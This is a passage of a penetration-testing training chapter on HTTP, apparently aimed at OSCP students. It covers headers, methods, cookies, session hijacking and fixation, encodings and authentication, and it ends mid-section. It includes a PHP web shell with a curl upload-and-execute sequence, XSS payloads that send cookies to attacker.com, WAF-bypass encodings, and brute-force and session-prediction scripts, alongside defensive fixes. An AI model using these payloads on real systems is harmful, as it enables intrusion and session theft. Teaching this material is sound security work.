
# HTTP Protocol Analysis: The Language of the Web

> **Executive Summary**: HTTP is the foundation of all web security. Every web vulnerability—from SQL injection to XSS—is delivered via HTTP requests and responses. This chapter teaches you to speak HTTP fluently, intercept and modify traffic, understand headers and encoding, exploit state management vulnerabilities, and build custom exploits. Mastering HTTP is non-negotiable for OSCP and professional penetration testing. You'll learn to think like a browser, act like a hacker, and exploit web applications at the protocol level.

**What You'll Learn**:
- Complete HTTP protocol from beginner to advanced
- Request/response anatomy and manipulation
- State management and session attacks
- Cookie security and session hijacking
- Web encodings and evasion techniques
- Manual exploitation without tools
- Burp Suite mastery for OSCP
- HTTP/2, HTTP/3, and modern protocols
- 25+ hands-on exploitation labs
- Real OSCP-style attack scenarios

---

## Table of Contents

1. [What is HTTP? (ABSOLUTE BEGINNER)](#1-what-is-http)
2. [HTTP Request Anatomy](#2-http-request-anatomy)
3. [HTTP Response Anatomy](#3-http-response-anatomy)
4. [HTTP Methods Deep Dive](#4-http-methods-deep-dive)
5. [HTTP Headers Comprehensive Guide](#5-http-headers-comprehensive-guide)
6. [Status Codes and What They Reveal](#6-status-codes-and-what-they-reveal)
7. [Cookies and State Management](#7-cookies-and-state-management)
8. [Session Hijacking and Fixation](#8-session-hijacking-and-fixation)
9. [Web Encodings and Evasion](#9-web-encodings-and-evasion)
10. [Content Types and MIME Sniffing](#10-content-types-and-mime-sniffing)
11. [HTTP Authentication Mechanisms](#11-http-authentication-mechanisms)
12. [HTTPS and TLS](#12-https-and-tls)
13. [HTTP/2 and HTTP/3](#13-http2-and-http3)
14. [Request Smuggling](#14-request-smuggling)
15. [Practical Labs with Burp Suite](#15-practical-labs-with-burp-suite)
16. [Manual HTTP with Netcat and cURL](#16-manual-http-with-netcat-and-curl)
17. [OSCP Attack Scenarios](#17-oscp-attack-scenarios)
18. [Common Pitfalls](#18-common-pitfalls)
19. [Interview Questions](#19-interview-questions)
20. [Hands-On Exercises](#20-hands-on-exercises)

---

## 1. What is HTTP? (ABSOLUTE BEGINNER)

### 1.1 HTTP Basics

**ABSOLUTE BEGINNER**: HTTP (HyperText Transfer Protocol) is how your browser talks to websites. It's a text-based protocol—meaning you can literally read it with your eyes.

**The Conversation**:
```
You (Browser):  "Hey server, give me the homepage!"
Server:         "Here it is: <html>...</html>"
```

**Key Characteristics**:
1. **Request-Response**: Client asks, server answers
2. **Stateless**: Server forgets you after each request
3. **Text-Based**: Human-readable (unlike binary protocols)
4. **Port 80**: Default port for HTTP (443 for HTTPS)

### 1.2 Why HTTP Matters for Hacking

**Every web attack uses HTTP**:
- **SQL Injection**: Malicious SQL in HTTP parameters
- **XSS**: Malicious JavaScript in HTTP responses
- **CSRF**: Forged HTTP requests
- **Session Hijacking**: Stolen cookies from HTTP headers
- **File Upload**: Malicious files via HTTP POST

**The Hacker's Advantage**: Understanding HTTP lets you:
- Craft custom exploits
- Bypass WAFs (Web Application Firewalls)
- Exploit protocol-level vulnerabilities
- Automate attacks with scripts

### 1.3 HTTP vs HTTPS

```
ASCII Diagram: HTTP vs HTTPS

HTTP (Port 80 - Unencrypted):
┌─────────┐    "GET /login"     ┌─────────┐
│ Browser │ ──────────────────> │ Server  │
│         │ <────────────────── │         │
└─────────┘    "<html>..."      └─────────┘
    ↑                                ↑
    └──── 🔴 ATTACKER CAN SEE ──────┘
    (Passwords, cookies visible!)


HTTPS (Port 443 - Encrypted):
┌─────────┐    [Encrypted]      ┌─────────┐
│ Browser │ ══════════════════> │ Server  │
│         │ <══════════════════ │         │
└─────────┘    [Encrypted]      └─────────┘
    ↑                                ↑
    └──── 🟢 ENCRYPTED (TLS) ────────┘
```

**Security Implications**:
- **HTTP**: All data visible to anyone on the network (Wi-Fi sniffing)
- **HTTPS**: Data encrypted with TLS (but server can still be vulnerable)

---

## 2. HTTP Request Anatomy

### 2.1 The Complete Structure

A raw HTTP request has three parts:

```http
[1] GET /admin/users.php?id=1 HTTP/1.1        ← Request Line
[2] Host: target.com                          ← Headers
    User-Agent: Mozilla/5.0                   
    Cookie: session=abc123                    
    Accept: text/html                         
    Connection: keep-alive                    
[3]                                           ← Blank Line
    username=admin&password=secret            ← Body (if POST)
```

### 2.2 Part 1: Request Line

**Format**: `METHOD URI VERSION`

**Example**: `GET /admin/dashboard.php?view=users HTTP/1.1`

**Components**:
1. **Method**: What action? (GET, POST, PUT, DELETE, etc.)
2. **URI**: What resource? (`/login`, `/api/users/1`)
3. **Version**: HTTP/1.1 (standard) or HTTP/2

**Hacker's Focus**:
- Can I change the method? (GET → POST bypass)
- Can I access different URIs? (Path traversal: `/../../etc/passwd`)
- What version is the server using? (Affects exploits)

### 2.3 Part 2: Headers

**ABSOLUTE BEGINNER**: Headers are key-value pairs that provide metadata about the request.

**Critical Headers for Attackers**:

```http
Host: target.com                    ← REQUIRED in HTTP/1.1
User-Agent: Mozilla/5.0             ← Who you claim to be
Referer: http://google.com          ← Where you came from (CSRF protection)
Cookie: session=xyz; role=admin     ← State/authentication
Authorization: Basic YWRtaW46cGFzcw== ← Credentials
Content-Type: application/json      ← How to parse body
Content-Length: 42                  ← Body size in bytes
X-Forwarded-For: 127.0.0.1         ← "Real" IP (often trusted!)
Accept-Language: en-US              ← Preferred language
Connection: keep-alive              ← Reuse TCP connection
```

**Example: Exploiting X-Forwarded-For**:

Many applications trust `X-Forwarded-For` to get the user's IP. Bypass IP restrictions:

```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

# Server thinks request is from localhost!
# Bypasses: "Only allow admin from 127.0.0.1"
```

### 2.4 Part 3: Body

**ABSOLUTE BEGINNER**: The body contains data sent to the server (used with POST, PUT, etc.).

**Example: Login Form**:

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=12345
```

**Body Formats**:

1. **URL-Encoded** (HTML forms):
```
username=admin&password=test123
```

2. **JSON** (APIs):
```json
{"username": "admin", "password": "test123"}
```

3. **Multipart** (File uploads):
```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

---

## 3. HTTP Response Anatomy

### 3.1 The Complete Structure

```http
[1] HTTP/1.1 200 OK                           ← Status Line
[2] Server: Apache/2.4.41                     ← Headers
    Date: Fri, 24 Jan 2026 10:00:00 GMT       
    Content-Type: text/html; charset=UTF-8    
    Set-Cookie: session=xyz; Secure; HttpOnly 
    Content-Length: 1234                      
    X-Powered-By: PHP/7.4.3                   
[3]                                           ← Blank Line
    <html>                                    ← Body
      <h1>Welcome Admin!</h1>
    </html>
```

### 3.2 Part 1: Status Line

**Format**: `VERSION STATUS_CODE REASON`

**Example**: `HTTP/1.1 200 OK`

**Components**:
1. **Version**: HTTP/1.1
2. **Status Code**: Numeric result (200, 404, 500, etc.)
3. **Reason**: Human-readable description

### 3.3 Part 2: Response Headers

**Critical Headers for Attackers**:

```http
Server: Apache/2.4.41 Ubuntu         ← Version disclosure (CVE lookup!)
X-Powered-By: PHP/7.4.3              ← Technology stack
Set-Cookie: session=abc123; ...      ← Session management
Location: /dashboard                 ← Redirect target
Content-Security-Policy: ...         ← XSS protection
X-Frame-Options: DENY                ← Clickjacking protection
Strict-Transport-Security: ...       ← Force HTTPS
Access-Control-Allow-Origin: *       ← CORS (cross-origin)
```

**Example: Information Disclosure**:

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3

# Attacker now knows:
# - Apache version: Check for CVE-2021-41773 (path traversal)
# - PHP version: Check for known PHP vulnerabilities
# - OS: Ubuntu (Linux privilege escalation techniques)
```

### 3.4 Part 3: Response Body

The actual content (HTML, JSON, image, etc.):

```html
<!DOCTYPE html>
<html>
<head><title>Admin Panel</title></head>
<body>
  <h1>Welcome, admin!</h1>
  <!-- TODO: Remove debug info before production -->
  <!-- Database: mysql://root:password@localhost:3306/webapp -->
</body>
</html>
```

**Hacker's Gold Mine**: Look for:
- Comments with sensitive info
- Hidden form fields
- JavaScript with API endpoints
- Error messages with paths

---

## 4. HTTP Methods Deep Dive

### 4.1 GET - Retrieve Data

**Purpose**: Request a resource from the server.

**Characteristics**:
- Parameters in URL: `?id=1&name=admin`
- Idempotent (same result every time)
- Cached by browsers
- Logged in server logs
- Length limited (~2048 chars)

**Example**:
```http
GET /api/users?id=1 HTTP/1.1
Host: target.com
```

**Vulnerabilities**:
- **SQL Injection**: `?id=1' OR '1'='1`
- **IDOR**: `?id=2` (access another user's data)
- **Path Traversal**: `?file=../../etc/passwd`

### 4.2 POST - Submit Data

**Purpose**: Send data to server (create resource, submit form).

**Characteristics**:
- Parameters in body (not visible in URL)
- Not cached
- No length limit
- Not idempotent

**Example**:
```http
POST /api/users HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 45

{"username":"hacker","email":"test@test.com"}
```

**Vulnerabilities**:
- Same as GET (SQLi, XSS, etc.)
- **File Upload**: Malicious file uploads
- **XXE**: XML External Entity injection

### 4.3 PUT - Upload/Replace Resource

**Purpose**: Upload or completely replace a resource.

**Example**:
```http
PUT /api/users/1 HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"updated_user"}
```

**Vulnerabilities**:
- **Unrestricted File Upload**: `PUT /shell.php`
- **Overwrite Files**: Replace legitimate files

**OSCP Scenario**: WebDAV with PUT enabled:

```bash
# Test if PUT is allowed
curl -X OPTIONS http://target.com/

# Upload shell
curl -X PUT http://target.com/shell.php -d '<?php system($_GET["cmd"]); ?>'

# Execute
curl http://target.com/shell.php?cmd=whoami
```

### 4.4 DELETE - Remove Resource

**Purpose**: Delete a resource.

**Example**:
```http
DELETE /api/users/1 HTTP/1.1
Host: target.com
```

**Vulnerabilities**:
- **IDOR**: Delete other users' data
- **Privilege Escalation**: Delete admin logs

### 4.5 OPTIONS - Discover Allowed Methods

**Purpose**: Ask server what methods are allowed.

**Example**:
```http
OPTIONS /admin HTTP/1.1
Host: target.com
```

**Response**:
```http
HTTP/1.1 200 OK
Allow: GET, POST, PUT, DELETE, OPTIONS
```

**Reconnaissance Value**: Discover hidden functionality.

### 4.6 HEAD - Get Headers Only

**Purpose**: Same as GET but without response body.

**Use Cases**:
- Fast reconnaissance
- Check if file exists (200 vs 404)
- Get Content-Length before downloading

**Example**:
```bash
curl -I http://target.com/admin
# Only shows headers, faster than full GET
```

### 4.7 TRACE - Debug/Diagnostic

**Purpose**: Echo back the request (debugging).

**Vulnerability**: **Cross-Site Tracing (XST)**

```http
TRACE / HTTP/1.1
Host: target.com
Cookie: session=secret123
```

**Response**:
```http
HTTP/1.1 200 OK
Content-Type: message/http

TRACE / HTTP/1.1
Host: target.com
Cookie: session=secret123    ← Cookie reflected!
```

If TRACE is enabled, attacker can use XSS to steal HttpOnly cookies!

### 4.8 CONNECT - Establish Tunnel

**Purpose**: Create a TCP tunnel (used for HTTPS proxying).

**Exploitation**: Open proxy abuse:

```http
CONNECT evil.com:443 HTTP/1.1
Host: proxy.target.com

# If allowed, you can tunnel traffic through target's server
```

---

## 5. HTTP Headers Comprehensive Guide

### 5.1 General Headers

**Host** (REQUIRED in HTTP/1.1):
```http
Host: www.target.com
```

**Purpose**: Specify which virtual host to route to.

**Exploitation**: **Host Header Injection**

```http
Host: evil.com

# Server might use Host header in:
# - Password reset emails (link to evil.com)
# - Redirect location
# - SSRF payloads
```

**Connection**:
```http
Connection: keep-alive  # Reuse TCP connection
Connection: close       # Close after response
```

### 5.2 Request Headers

**User-Agent**:
```http
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

**Purpose**: Identify client (browser, bot, etc.).

**Exploitation**:
- **WAF Bypass**: Pretend to be Googlebot
- **Version-Specific Exploits**: Target old IE browsers

**Referer**:
```http
Referer: https://google.com/search?q=target
```

**Purpose**: Where did the request come from?

**Uses**:
- Analytics
- CSRF protection (check if request came from own site)

**Exploitation**: **CSRF Bypass** (if referer check is weak)

**Accept-***:
```http
Accept: text/html,application/xml
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
```

**Authorization**:
```http
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Types**:
1. **Basic**: Base64-encoded `username:password`
2. **Bearer**: JWT token
3. **Digest**: Hashed credentials
4. **OAuth**: OAuth token

**Example: Decoding Basic Auth**:
```bash
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d
# Output: admin:password
```

### 5.3 Security Headers

**X-Forwarded-For**:
```http
X-Forwarded-For: 203.0.113.1
```

**Purpose**: Original client IP (when behind proxy/load balancer).

**Exploitation**: **IP Whitelist Bypass**

```http
X-Forwarded-For: 127.0.0.1
# Pretend to be localhost
```

**X-Original-URL / X-Rewrite-URL**:
```http
GET /public HTTP/1.1
X-Original-URL: /admin
```

**Exploitation**: **403 Bypass** (if server trusts these headers)

### 5.4 Response Security Headers

**Content-Security-Policy (CSP)**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

**Purpose**: Prevent XSS by restricting where scripts can load from.

**Weak CSP**:
```http
Content-Security-Policy: default-src 'self' 'unsafe-inline'
# 'unsafe-inline' allows inline <script> tags → XSS possible!
```

**X-Frame-Options**:
```http
X-Frame-Options: DENY                # Cannot be framed
X-Frame-Options: SAMEORIGIN          # Only same origin can frame
X-Frame-Options: ALLOW-FROM https://trusted.com
```

**Purpose**: Prevent Clickjacking.

**Strict-Transport-Security (HSTS)**:
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**Purpose**: Force HTTPS for next 365 days.

**X-Content-Type-Options**:
```http
X-Content-Type-Options: nosniff
```

**Purpose**: Prevent MIME type sniffing (browser won't execute image as script).

---

## 6. Status Codes and What They Reveal

### 6.1 Success Codes (2xx)

**200 OK** - Request succeeded:
```http
HTTP/1.1 200 OK
```

**201 Created** - Resource created:
```http
HTTP/1.1 201 Created
Location: /api/users/42
```

**204 No Content** - Success, but no body:
```http
HTTP/1.1 204 No Content
# Common for DELETE requests
```

### 6.2 Redirection (3xx)

**301 Moved Permanently**:
```http
HTTP/1.1 301 Moved Permanently
Location: https://new-site.com
```

**Browser caches forever!**

**302 Found (Temporary Redirect)**:
```http
HTTP/1.1 302 Found
Location: /dashboard
```

**Common after login**:
```
POST /login → 302 → Location: /dashboard
```

**304 Not Modified** (Caching):
```http
HTTP/1.1 304 Not Modified
```

Browser uses cached version.

### 6.3 Client Errors (4xx)

**400 Bad Request**:
```http
HTTP/1.1 400 Bad Request
```

**Causes**:
- Malformed syntax
- Invalid JSON
- Missing required parameter

**401 Unauthorized**:
```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Admin Area"
```

**Meaning**: "Who are you? Please authenticate."

**403 Forbidden**:
```http
HTTP/1.1 403 Forbidden
```

**Meaning**: "I know who you are, but you can't access this."

**Bypass Techniques**:
```http
# Try different methods
GET /admin → 403
POST /admin → 200 ✓

# Try different paths
/admin → 403
/admin/ → 200 ✓
/admin.. → 200 ✓
/admin/./ → 200 ✓

# Try headers
GET /admin
X-Original-URL: /admin → 200 ✓
```

**404 Not Found**:
```http
HTTP/1.1 404 Not Found
```

**Information Leakage**:
```html
<!-- Bad: Reveals structure -->
Error: File '/var/www/html/secret/admin.php' not found

<!-- Good: Generic -->
404 - Page not found
```

**405 Method Not Allowed**:
```http
HTTP/1.1 405 Method Not Allowed
Allow: GET, POST
```

**Reconnaissance**: Server tells you allowed methods!

### 6.4 Server Errors (5xx)

**500 Internal Server Error**:
```http
HTTP/1.1 500 Internal Server Error
```

**Common Causes**:
- SQL Injection (syntax error in query)
- Unhandled exception
- File permission issue

**Exploitation**: Trigger 500 to see error details:

```
GET /search?q=' → 500 Internal Server Error

Error: You have an error in your SQL syntax near ''' at line 1
SELECT * FROM products WHERE name = '''
                                      ↑
                                   SQLi confirmed!
```

**502 Bad Gateway**:
```http
HTTP/1.1 502 Bad Gateway
```

**Meaning**: Proxy/gateway got invalid response from upstream server.

**503 Service Unavailable**:
```http
HTTP/1.1 503 Service Unavailable
Retry-After: 3600
```

**Causes**:
- Server overloaded
- Maintenance mode
- DDoS attack

---

## 7. Cookies and State Management

### 7.1 The Cookie Lifecycle

**ABSOLUTE BEGINNER**: HTTP is stateless—server forgets you instantly. Cookies solve this.

**The Flow**:

```
ASCII Diagram: Cookie Lifecycle

1. Login Request:
   ┌─────────┐  POST /login           ┌─────────┐
   │ Browser │  user=admin&pass=123   │ Server  │
   │         │ ─────────────────────> │         │
   └─────────┘                        └─────────┘
                                           │
                                           ▼
                                    [Validate credentials]
                                    [Create session in DB]
                                    session_id = "abc123"
                                    user_id = 42

2. Set Cookie:
   ┌─────────┐                        ┌─────────┐
   │ Browser │ <───────────────────── │ Server  │
   │         │  Set-Cookie:           │         │
   └─────────┘  session=abc123        └─────────┘
       │
       ▼
   [Save cookie in browser]

3. Subsequent Requests:
   ┌─────────┐  GET /profile          ┌─────────┐
   │ Browser │  Cookie: session=abc123│ Server  │
   │         │ ─────────────────────> │         │
   └─────────┘                        └─────────┘
                                           │
                                           ▼
                                    [Lookup session "abc123"]
                                    [Found: user_id=42]
                                    [Return user 42's profile]
```

### 7.2 Cookie Attributes

**Complete Cookie Syntax**:
```http
Set-Cookie: session=abc123; Domain=.target.com; Path=/; Expires=Wed, 24 Jan 2027 10:00:00 GMT; Max-Age=3600; Secure; HttpOnly; SameSite=Strict
```

**Attribute Breakdown**:

1. **Domain**:
```http
Set-Cookie: session=abc123; Domain=.target.com
```

- `.target.com`: Cookie sent to `www.target.com`, `api.target.com`, `sub.target.com`
- `www.target.com`: Cookie only sent to `www.target.com`

**Attack**: If `Domain=.target.com`, attacker can steal cookies from `evil.target.com`!

2. **Path**:
```http
Set-Cookie: session=abc123; Path=/admin
```

Cookie only sent for `/admin/*` paths.

3. **Expires / Max-Age**:
```http
Set-Cookie: session=abc123; Expires=Wed, 24 Jan 2027 10:00:00 GMT
Set-Cookie: session=abc123; Max-Age=3600  # 1 hour in seconds
```

- **Session Cookie** (no Expires): Deleted when browser closes
- **Persistent Cookie** (with Expires): Survives browser restart

4. **Secure**:
```http
Set-Cookie: session=abc123; Secure
```

**Effect**: Cookie ONLY sent over HTTPS.

**Attack**: If missing, attacker on Wi-Fi can sniff cookie over HTTP!

5. **HttpOnly**:
```http
Set-Cookie: session=abc123; HttpOnly
```

**Effect**: JavaScript cannot access cookie.

```javascript
// If HttpOnly is set:
document.cookie  // "" (cannot see session cookie)

// If HttpOnly is missing:
document.cookie  // "session=abc123" ← XSS can steal this!
```

6. **SameSite**:
```http
Set-Cookie: session=abc123; SameSite=Strict
```

**Values**:
- **Strict**: Cookie never sent on cross-site requests
- **Lax**: Cookie sent on top-level navigation (clicking link), not on `<img>`, `<iframe>`
- **None**: Cookie always sent (requires `Secure`)

**CSRF Protection**:
```
SameSite=Strict:
  User on evil.com clicks:
  <a href="https://bank.com/transfer?to=attacker&amount=1000">Click here!</a>
  
  Request to bank.com does NOT include session cookie!
  → CSRF attack fails ✓
```

### 7.3 Cookie Security Vulnerabilities

**Vulnerability 1: Missing HttpOnly**

```http
Set-Cookie: session=abc123
# Missing HttpOnly!
```

**Exploitation (XSS to Session Hijacking)**:
```javascript
// Attacker injects XSS payload:
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

// Attacker receives: session=abc123
// Attacker sets cookie in their browser → logged in as victim!
```

**Vulnerability 2: Missing Secure**

```http
Set-Cookie: session=abc123
# Missing Secure!
```

**Exploitation (Wi-Fi Sniffing)**:
```bash
# Victim visits http://target.com (not https)
# Attacker on same Wi-Fi runs:
tcpdump -i wlan0 -A | grep Cookie

# Output:
# Cookie: session=abc123
# Attacker steals session!
```

**Vulnerability 3: Weak Session ID**

```http
Set-Cookie: session=user123
# Predictable session ID!
```

**Exploitation (Session Prediction)**:
```python
# If user123 is current user, try:
for i in range(1, 1000):
    session = f"user{i}"
    response = requests.get("https://target.com/profile", 
                           cookies={"session": session})
    if "Welcome" in response.text:
        print(f"[+] Valid session: {session}")
```

**Secure Session ID**: 
```
session=8f7a3b2c1e9d4f6a5b8c7e2d1a3f5b9c4e7a2d6f1b8c5e3a7d2f6b1c8e5a3d7f
# 128-bit random, hex-encoded
```

---

## 8. Session Hijacking and Fixation

### 8.1 Session Hijacking

**ABSOLUTE BEGINNER**: Stealing someone's session cookie to impersonate them.

**Attack Scenario**:

```
Step 1: Victim logs in
  Browser → Server: POST /login (user=alice&pass=secret)
  Server → Browser: Set-Cookie: session=xyz789

Step 2: Attacker steals cookie (XSS/Sniffing/XSS)
  Attacker obtains: session=xyz789

Step 3: Attacker uses stolen cookie
  Attacker's Browser → Server: GET /profile
                               Cookie: session=xyz789
  Server thinks: "This is Alice!"
  Server → Attacker: Alice's profile data
```

**Methods to Steal Cookies**:

1. **XSS (Cross-Site Scripting)**:
```html
<script>
new Image().src='http://attacker.com/steal?c='+document.cookie
</script>
```

2. **Network Sniffing** (if HTTPS not enforced):
```bash
tcpdump -i eth0 -A | grep Cookie
```

3. **Man-in-the-Middle** (ARP spoofing, evil twin Wi-Fi)

4. **Malware** (steal cookies from browser storage)

### 8.2 Session Fixation

**ABSOLUTE BEGINNER**: Attacker sets the victim's session ID to a known value.

**Attack Flow**:

```
ASCII Diagram: Session Fixation Attack

Step 1: Attacker gets session ID
  ┌──────────┐                      ┌─────────┐
  │ Attacker │ ──── GET /login ───> │ Server  │
  │          │ <─── Set-Cookie ──── │         │
  └──────────┘      session=abc123  └─────────┘
       │
       └─ Attacker knows: session=abc123

Step 2: Attacker sends link to victim
  Attacker → Victim: "Click here to login!"
  Link: https://target.com/login?sessionid=abc123

Step 3: Victim clicks and logs in
  ┌─────────┐                       ┌─────────┐
  │ Victim  │ ── POST /login ────> │ Server  │
  │         │    user=alice         │         │
  │         │    Cookie: abc123     │         │
  └─────────┘                       └─────────┘
                                         │
                                         ▼
                                   [Server validates]
                                   [Session abc123 → alice]

Step 4: Attacker uses known session
  ┌──────────┐                      ┌─────────┐
  │ Attacker │ ── GET /profile ──> │ Server  │
  │          │    Cookie: abc123    │         │
  └──────────┘                      └─────────┘
                                         │
                                         └─> Returns Alice's data!
```

**Vulnerable Code**:
```php
<?php
// BAD: Accept session ID from GET parameter
session_id($_GET['sessionid']);
session_start();

if (login_valid($_POST['user'], $_POST['pass'])) {
    $_SESSION['user'] = $_POST['user'];
    // Session ID NOT regenerated!
}
?>
```

**Fix**:
```php
<?php
session_start();

if (login_valid($_POST['user'], $_POST['pass'])) {
    session_regenerate_id(true);  // ✓ Generate new session ID
    $_SESSION['user'] = $_POST['user'];
}
?>
```

### 8.3 Defense Against Session Attacks

**1. Regenerate Session ID on Login**:
```php
session_regenerate_id(true);
```

**2. Use Secure Cookie Flags**:
```http
Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict
```

**3. Bind Session to IP/User-Agent**:
```php
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'];

// On each request:
if ($_SESSION['ip'] != $_SERVER['REMOTE_ADDR']) {
    session_destroy();  // Session hijacked!
}
```

**4. Session Timeout**:
```php
$timeout = 3600; // 1 hour
if (time() - $_SESSION['last_activity'] > $timeout) {
    session_destroy();
}
$_SESSION['last_activity'] = time();
```

---

## 9. Web Encodings and Evasion

### 9.1 Why Encoding Matters

**ABSOLUTE BEGINNER**: Different systems interpret data differently. Attackers use encoding to bypass filters.

**The WAF Bypass Game**:
```
Attack:    <script>alert(1)</script>
WAF:       "BLOCKED! Detected <script> tag"

Attack:    %3Cscript%3Ealert(1)%3C/script%3E  (URL encoded)
WAF:       "Looks safe, not a script tag"
App:       Decodes to: <script>alert(1)</script>  → XSS!
```

### 9.2 URL Encoding (Percent Encoding)

**Format**: `%HEX`

**Common Characters**:
```
Space     = %20
<         = %3C
>         = %3E
"         = %22
'         = %27
&         = %26
?         = %3F
/         = %2F
\         = %5C
```

**Example**:
```
Original: /search?q=<script>alert(1)</script>
Encoded:  /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

**Double Encoding**:
```
<         → %3C         (1st encode)
%3C       → %253C       (2nd encode: % → %25)
```

**Attack**:
```
WAF:  "%253C is safe" → forwards to app
App:  Decodes %253C → %3C → <  → XSS!
```

### 9.3 HTML Entity Encoding

**Format**: `&name;` or `&#decimal;` or `&#xhex;`

**Common Entities**:
```
<         = &lt;        = &#60;       = &#x3C;
>         = &gt;        = &#62;       = &#x3E;
"         = &quot;      = &#34;       = &#x22;
'         = &apos;      = &#39;       = &#x27;
&         = &amp;       = &#38;       = &#x26;
```

**XSS Example**:
```html
<!-- Blocked -->
<img src=x onerror=alert(1)>

<!-- Bypassed (if server decodes HTML entities) -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
                    a    l    e    r    t
```

### 9.4 Base64 Encoding

**Purpose**: Encode binary data as ASCII text.

**Format**: `Base64(data)`

**Example**:
```bash
echo -n "admin:password" | base64
# Output: YWRtaW46cGFzc3dvcmQ=
```

**Basic Authentication**:
```http
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
# Server decodes: admin:password
```

**Exploitation**: Brute-force credentials:
```python
import base64
import requests

wordlist = ["admin", "root", "user"]
for user in wordlist:
    for pwd in wordlist:
        creds = f"{user}:{pwd}".encode()
        b64 = base64.b64encode(creds).decode()
        headers = {"Authorization": f"Basic {b64}"}
        r = requests.get("https://target.com/admin", headers=headers)
        if r.status_code == 200:
            print(f"[+] Found: {user}:{pwd}")
```

### 9.5 Unicode Encoding

**Format**: `\uXXXX` (4 hex digits)

**Example**:
```javascript
// Normal
alert(1)

// Unicode
\u0061\u006C\u0065\u0072\u0074(1)
   a     l     e     r     t
```

**Bypass Example**:
```javascript
// Blocked
eval('alert(1)')

// Bypassed
eval('\u0061\u006C\u0065\u0072\u0074(1)')
```

### 9.6 Hex Encoding

**Format**: `\xHH` (2 hex digits)

**Example**:
```python
# Normal string
payload = "admin"

# Hex encoded
payload = "\x61\x64\x6D\x69\x6E"
           a    d    m    i    n
```

**SQL Injection Bypass**:
```sql
-- Blocked
SELECT * FROM users WHERE user='admin'

-- Bypassed (if DB supports hex)
SELECT * FROM users WHERE user=0x61646D696E
                                  admin (hex)
```

### 9.7 Encoding Cheat Sheet

| Encoding | Example Input | Example Output | Use Case |
|----------|---------------|----------------|----------|
| URL | `<script>` | `%3Cscript%3E` | Query parameters, WAF bypass |
| HTML Entity | `<script>` | `&lt;script&gt;` | XSS bypass, display in HTML |
| Base64 | `admin:pass` | `YWRtaW46cGFzcw==` | Auth headers, obfuscation |
| Unicode | `alert` | `\u0061\u006C\u0065\u0072\u0074` | JavaScript WAF bypass |
| Hex | `admin` | `\x61\x64\x6D\x69\x6E` | SQLi, binary exploits |

---

## 10. Content Types and MIME Sniffing

### 10.1 Content-Type Header

**ABSOLUTE BEGINNER**: Tells the browser/server what type of data is being sent.

**Common Content-Types**:

```http
Content-Type: text/html; charset=UTF-8
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
Content-Type: image/png
Content-Type: application/pdf
Content-Type: text/plain
```

### 10.2 MIME Type Attacks

**Attack 1: Content-Type Mismatch**

```
Upload: evil.php (contains PHP code)
Server saves as: uploads/evil.php

Request: GET /uploads/evil.php
Response: Content-Type: image/png  (server misconfigured)

Result: PHP code executed even though labeled as image!
```

**Attack 2: MIME Sniffing**

**ABSOLUTE BEGINNER**: Browser ignores Content-Type and guesses type from file content.

```
Upload: image.jpg (actually contains HTML: <script>alert(1)</script>)

Server: Content-Type: image/jpeg
Browser: "This looks like HTML, not an image"
         Renders as HTML → XSS!
```

**Defense**:
```http
X-Content-Type-Options: nosniff
# Browser must respect Content-Type, no guessing
```

### 10.3 Content-Type in POST Requests

**Form Submission**:
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=12345
```

**JSON API**:
```http
POST /api/login HTTP/1.1
Content-Type: application/json
Content-Length: 45

{"username":"admin","password":"12345"}
```

**File Upload**:
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

### 10.4 Content-Type Confusion Attacks

**Scenario**: API accepts both JSON and URL-encoded

```http
# Normal JSON request
POST /api/update HTTP/1.1
Content-Type: application/json

{"role":"user"}
```

**Attack**: Change Content-Type to bypass validation:

```http
POST /api/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

role=admin
# Server might parse this differently, bypassing JSON validation!
```

---

## 11. HTTP Authentication Mechanisms

### 11.1 Basic Authentication

**ABSOLUTE BEGINNER**: Sends username:password in Base64 (NOT ENCRYPTED!).

**Flow**:
```
1. Request without credentials:
   GET /admin HTTP/1.1
   
2. Server challenges:
   HTTP/1.1 401 Unauthorized
   WWW-Authenticate: Basic realm="Admin Area"
   
3. Browser prompts for user/pass
   User enters: admin / secret123
   
4. Browser sends:
   GET /admin HTTP/1.1
   Authorization: Basic YWRtaW46c2VjcmV0MTIz
                        admin:secret123 (base64)
```

**Decoding**:
```bash
echo "YWRtaW46c2VjcmV0MTIz" | base64 -d
# Output: admin:secret123
```

**Vulnerabilities**:
- **Not encrypted** (anyone can decode Base64)
- **Sent on every request** (vulnerable to sniffing)
- **No logout mechanism**
- **Brute-forceable**

**OSCP Attack**:
```bash
# Brute-force Basic Auth
